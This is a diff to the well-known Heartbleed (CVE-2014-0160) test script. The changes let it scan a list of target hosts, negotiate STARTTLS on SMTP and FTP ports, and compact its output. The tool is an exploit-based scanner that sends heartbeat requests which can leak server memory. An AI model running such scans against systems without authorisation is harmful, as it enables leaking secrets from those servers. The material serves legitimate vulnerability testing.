@@ -1,13 +1,11 @@
 #!/usr/bin/python
 
-# Scan a target list, on specified ports, for CVE-2014-0160 in various
-# versions of SSL/TLS. Created by Brodie McRae, adapted from original POC by Jared
-# Tries to keep output to one line per host
-
 # Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
 # The author disclaims copyright to this source code.
 
-# Usage example: python ssltest.py targets.txt [port]
+# Modified by bjm to more generically check a line-separated target list
+
+# Usage example: python ssltest.py targets.txt
 
 import sys
 import struct
@@ -20,11 +18,13 @@ from optparse import OptionParser
 options = OptionParser(usage='%prog file [port]', description='Test for SSL heartbleed vulnerability (CVE-2014-0160) on multiple hosts, takes a file as an argument')
 
 versions = (['SSL 3.0','03 00'],
-           ['TLS 1.0','03 01'],
-           ['TLS 1.1','03 02'],
-           ['TLS 1.2','03 03'])
+            ['TLS 1.0','03 01'],
+            ['TLS 1.1','03 02'],
+            ['TLS 1.2','03 03'])
 
 timeout = 2  # tcp connection timeout
+
+buffy = 4096 # tcp recv buffer
 
 def h2bin(x):
     return x.replace(' ', '').replace('\n', '').decode('hex')
@@ -112,29 +112,44 @@ def hit_hb(s,hb):
 def is_vulnerable(target, port):
 
     for version in versions:
-        print version[0]+"..",
-        sys.stdout.flush()
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(timeout)
+        print "[C:",
+        sys.stdout.flush()
 
         try:
             s.connect((target, port))
+            if port == 25: # smtp
+                s.recv(buffy)
+                s.send("EHLO openssl.client.net\n")
+                s.recv(buffy)
+                s.send("STARTTLS\n")
+                s.recv(buffy)
+                print "STARTTLS.",
+            if port == 21: # ftp
+                s.recv(buffy)
+                s.send("AUTH TLS\n")
+                s.recv(buffy)
+                print "STARTTLS.",
         except socket.timeout, e:
-            print "Timeout.",
+            print "Timeout]",
             return None
         except socket.error, e:
-            print e[1]+".",
+            print e[1]+"]",
             return None
         except Exception, e:
-            print "Exception.",
+            print "Exception]",
             return None
+
+        print version[0]+"..",
+        sys.stdout.flush()
 
         s.send(get_hello(version[1]))
 
         while True:
             typ, ver, pay = recvmsg(s)
             if typ == None:
-                print "Conn closed by server.",
+                print "Srv closed conn.",
                 break
             # Look for server hello done message.
             if typ == 22 and ord(pay[0]) == 0x0E:
@@ -145,6 +160,8 @@ def is_vulnerable(target, port):
         s.close()
         if vulnerable:
             return vulnerable
+        else:
+           print "pass]",
     return False
 
 
